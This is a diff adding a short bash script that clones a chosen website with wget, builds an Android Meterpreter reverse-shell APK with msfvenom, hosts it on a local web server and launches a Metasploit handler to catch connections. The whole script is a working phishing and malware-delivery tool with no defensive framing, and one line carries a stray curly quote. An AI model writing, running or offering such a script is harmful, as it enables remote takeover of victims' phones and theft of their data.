@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# Prompt user for URL
+read -p "Enter the URL of the website you want to clone: " TARGET_URL
+
+# Set LHOST and LPORT
+LHOST="YOUR_IP_ADDRESS"
+LPORT="YOUR_LISTENING_PORT"’
+
+# Clone the website
+echo "Cloning the website..."
+wget --mirror -p --convert-links -P . $TARGET_URL
+
+# Move to the website directory
+echo "Moving to website directory..."
+cd $(basename $TARGET_URL)
+
+# Generate payload for Android
+echo "Generating payload for Android..."
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk
+
+# Start web server
+echo "Starting web server..."
+python -m SimpleHTTPServer 80 &
+
+# Start Metasploit handler
+echo "Starting Metasploit handler..."
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
